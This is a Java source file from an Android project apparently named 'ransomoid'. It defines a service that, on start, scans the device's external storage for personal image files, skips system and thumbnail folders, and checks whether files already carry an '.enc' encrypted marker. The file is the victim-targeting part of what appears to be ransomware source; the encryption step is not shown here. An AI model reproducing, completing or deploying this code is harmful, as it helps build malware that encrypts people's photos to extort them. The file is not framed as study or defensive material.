package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;
import java.util.ArrayList;

import falezza.fabio.ransomoid.utils.FileProcessor;

public class ParentService extends Service {
    private static final String[] imgExtensions =
            {".jpg", ".jpeg", ".png", ".JPG", ".PNG", ".JPEG"};

    private static final String[] excludeExtensions = {"Android/data", ".thumbnails"};

    ArrayList<File> imgList;


    public ParentService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        FileProcessor fileProcessor = FileProcessor.getInstance();
        this.imgList = fileProcessor.getFiles(Environment.getExternalStorageDirectory(),
                imgExtensions, excludeExtensions);
    }

    protected boolean isEncrypted(File file) {
        return file.getPath().contains(".enc");
    }
}
